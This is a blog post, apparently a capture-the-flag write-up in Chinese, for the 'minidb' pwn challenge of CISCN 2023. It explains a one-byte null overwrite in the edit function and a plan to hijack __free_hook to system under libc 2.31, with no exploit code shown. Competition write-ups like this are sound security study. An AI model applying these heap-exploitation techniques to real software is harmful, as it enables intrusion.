<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="zh-CN" data-mode="dark">
  <head>
  <style>
    #canvas-dust {
      z-index: -65536;
      pointer-events: none;
      position: fixed;
      top: 0;
      left: 0;
    }
  </style>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" >
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="CISCN 2023 华东北赛区 AWDPlus pwn 题复现" />
<meta name="author" content="imLZH1" />
<meta property="og:locale" content="zh_CN" />
<meta name="description" content="‍" />
<meta property="og:description" content="‍" />
<link rel="canonical" href="http://localhost:4000/posts/CISCN-2023-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-AWDPlus-pwn-%E9%A2%98%E5%A4%8D%E7%8E%B0/" />
<meta property="og:url" content="http://localhost:4000/posts/CISCN-2023-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-AWDPlus-pwn-%E9%A2%98%E5%A4%8D%E7%8E%B0/" />
<meta property="og:site_name" content="imLZH1’ Blog" />
<meta property="og:image" content="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/log.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-01-23T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/log.png" />
<meta property="twitter:title" content="CISCN 2023 华东北赛区 AWDPlus pwn 题复现" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"imLZH1"},"dateModified":"2024-01-23T00:00:00+08:00","datePublished":"2024-01-23T00:00:00+08:00","description":"‍","headline":"CISCN 2023 华东北赛区 AWDPlus pwn 题复现","image":"/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/log.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/CISCN-2023-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-AWDPlus-pwn-%E9%A2%98%E5%A4%8D%E7%8E%B0/"},"url":"http://localhost:4000/posts/CISCN-2023-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-AWDPlus-pwn-%E9%A2%98%E5%A4%8D%E7%8E%B0/"}</script>
<!-- End Jekyll SEO tag -->


  <title>CISCN 2023 华东北赛区 AWDPlus pwn 题复现 | imLZH1' Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imLZH1' Blog">
<meta name="application-name" content="imLZH1' Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    

    <link rel="stylesheet" href="/assets/lib/fonts/main.css">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/lib/bootstrap/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/lib/fontawesome-free/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="/assets/lib/tocbot/tocbot.min.css">
  

  
    <link rel="stylesheet" href="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="/assets/lib/magnific-popup/magnific-popup.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<canvas id="canvas-dust"></canvas>
<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/tx.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">imLZH1' Blog</a>
    </h1>
    <!--
    <p class="site-subtitle fst-italic mb-0"></p>
    -->
    <p id="copywriting" class="site-subtitle fst-italic mb-0"></p>

    <script text="javascript">
          fetch('/assets/index_about.json',{headers:({
            'copywriting.jsion': 'application/x-www-form-urlencoded'
          })})
          .then(function(response) {
            return response.json();
          })
          .then(function(myJson) {
            var max = myJson.length;
            var copywritingId = Math.ceil(Math.random()*max)-1;
            console.log(`%c
      _    _.--.____.--._
     ( )=.-":;:;:;;':;:;:;"-._
      \\\\:;:;:;:;:;;:;::;:;:;:\\
       \\\\:;:;:;:;:;;:;:;:;:;:;\\
        \\\\:;::;:;:;:;:;::;:;:;:\\
         \\\\:;:;:;:;:;;:;::;:;:;:\\
          \\\\:;::;:;:;:;:;::;:;:;:\\
           \\\\;;:;:_:--:_:_:--:_;:;\\
            \\\\_.-"             "-._\\
             \\\\
              \\\\
               \\\\
                \\\\
                 \\\\
                  \\\\\ `,'color: #03A9F4; font-weight: bold');
            console.log(`%c `+myJson[copywritingId], `color: #03A9F4; font-weight: bold`);
            document.getElementById('copywriting').innerHTML = myJson[copywritingId];
          });
          </script>
	<script>
		'use strict';
		function getElement(string, item = document.documentElement) {
		    let tmp = item.querySelector(string);
		    if (tmp === null) {
			throw new Error("Unknown HTML");
		    }
		    return tmp;
		}
		function getParent(item, level = 1) {
		    while (level--) {
			let tmp = item.parentElement;
			if (tmp === null) {
			    throw new Error("Unknown HTML");
			}
			item = tmp;
		    }
		    return item;
		}
		function format(format, ...args) {
		    return format.replaceAll(/\$\*?[0-9]*/g, (match) => {
			if (match === '$*') {
			    return '';
			}
			let Index = match.slice(1);
			if (Index >= args.length) {
			    return '';
			}
			return args[Index];
		    });
		}
		class dust {
		    constructor(x = 50, y = 50) {
			this.vx = Math.random() * 1 + 1;
			this.vy = Math.random() * 1 + 0.01;
			this.shadowBlur = Math.random() * 3;
			this.shadowX = (Math.random() * 2) - 1;
			this.shadowY = (Math.random() * 2) - 1;
			this.radiusX = Math.random() * 1.5 + 0.5;
			this.radiusY = this.radiusX * (Math.random() * (1.3 - 0.3) + 0.3);
			this.rotation = Math.PI * Math.floor(Math.random() * 2);
			this.x = x;
			this.y = y;
		    }
		}
		class canvasDust {
		    constructor(canvasID) {
			this.color = '#fff';
			this.width = 300;
			this.height = 300;
			this.dustQuantity = 50;
			this.dustArr = [];
			this.inStop = false;
			this.build = () => {
			    this.resize();
			    if (this.ctx) {
				const point = canvasDust.getPoint(this.dustQuantity);
				for (let i of point) {
				    const dustObj = new dust(i[0], i[1]);
				    this.buildDust(dustObj);
				    this.dustArr.push(dustObj);
				}
				requestAnimationFrame(this.paint);
			    }
			};
			this.paint = () => {
			    if (this.inStop) {
				return;
			    }
			    const dustArr = this.dustArr;
			    for (let i of dustArr) {
				this.ctx.clearRect(i.x - 6, i.y - 6, 12, 12);
				if (i.x < -5 || i.y < -5) {
				    const x = this.width;
				    const y = Math.floor(Math.random() * window.innerHeight);
				    i.x = x;
				    i.y = y;
				}
				else {
				    i.x -= i.vx;
				    i.y -= i.vy;
				}
			    }
			    for (let i of dustArr) {
				this.buildDust(i);
			    }
			    requestAnimationFrame(this.paint);
			};
			this.buildDust = (dust) => {
			    const ctx = this.ctx;
			    ctx.beginPath();
			    ctx.shadowBlur = dust.shadowBlur;
			    ctx.shadowOffsetX = dust.shadowX;
			    ctx.shadowOffsetY = dust.shadowY;
			    ctx.ellipse(dust.x, dust.y, dust.radiusX, dust.radiusY, dust.rotation, 0, Math.PI * 2);
			    ctx.closePath();
			    ctx.fill();
			};
			this.resize = () => {
			    const canvas = this.canvas;
			    const width = window.innerWidth;
			    const height = window.innerHeight;
			    this.width = width;
			    this.height = height;
			    this.dustQuantity = Math.floor((width + height) / 38);
			    canvas.width = width;
			    canvas.height = height;
			    this.ctx.shadowColor =
				this.ctx.fillStyle = this.color;
			};
			this.stop = () => {
			    this.inStop = true;
			};
			this.play = () => {
			    if (this.inStop === true) {
				this.inStop = false;
				requestAnimationFrame(this.paint);
			    }
			};
			const canvas = getElement(canvasID);
			this.canvas = canvas;
			this.ctx = this.canvas.getContext('2d');
			this.build();
			window.addEventListener('resize', this.resize);
		    }
		}
		canvasDust.getPoint = (number = 1) => {
		    let point = [];
		    for (let i = 0; i < number; ++i) {
			const x = Math.floor(Math.random() * window.innerWidth);
			const y = Math.floor(Math.random() * window.innerHeight);
			point.push([x, y]);
		    }
		    return point;
		};
		try {
		    var canvasDusts = new canvasDust('#canvas-dust');
		}
		catch (e) { }
	  </script>	
	  


  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>首页</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>归档</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>关于</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imLZH1"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github-alt"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['qingwachong','qq.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                首页
              </a>
            </span>

          
        
          
        
          
            
              <span>CISCN 2023 华东北赛区 AWDPlus pwn 题复现</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      文章
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="搜索..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">取消</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>CISCN 2023 华东北赛区 AWDPlus pwn 题复现</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        发表于
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1705939200"
  data-df="YYYY/MM/DD"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  2024/01/23
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/log.png" class="popup img-link preview-img shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/log.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          作者

          <em>
            
              
                
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="3479 字"
>
  <em>19 分钟</em>阅读</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p>‍</p>

<ul>
  <li>第十六届全国大学生信息安全竞赛—创新实践能力赛 华东北赛区</li>
</ul>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="minidb"><span class="me-2">minidb</span><a href="#minidb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="程序分析"><span class="me-2">程序分析</span><a href="#程序分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>
    <p>heap pwn 第一步 写菜单</p>
  </li>
  <li>
    <p>类似一个数据库， 可以，添加数据库，删除数据库，show 数据库…..</p>
  </li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114143355-0lynhba.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114143355-0lynhba.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>use_db() 里面还有一些操作</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114143536-1yji0t0.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114143536-1yji0t0.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>漏洞点在 use_db 里的 edit 功能里</li>
  <li>18行 行可以输入 255 个字符串</li>
  <li>19行测长度，21 虽然有长度限制防止堆溢出</li>
  <li>但是 在 20行  就已经使用 到 输入字符串的长度了，heap_addr + len + 0x10 = 0</li>
  <li>如果堆块的大小是 0xa0, 而输入的是 0x100 ，这样的话很明显</li>
  <li>可以将下面一个堆块的size 或内容 1字节清空，</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114143627-4z0uqqt.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114143627-4z0uqqt.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>比如修改 fd</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114144341-iojtu1l.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240114144341-iojtu1l.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>漏洞找到了，后面就是堆风水了</li>
</ul>

<p>‍</p>

<ul>
  <li>libc 2.31 劫持 <code class="language-plaintext highlighter-rouge">__free_hook</code>​ 为 <code class="language-plaintext highlighter-rouge">system</code>​</li>
</ul>

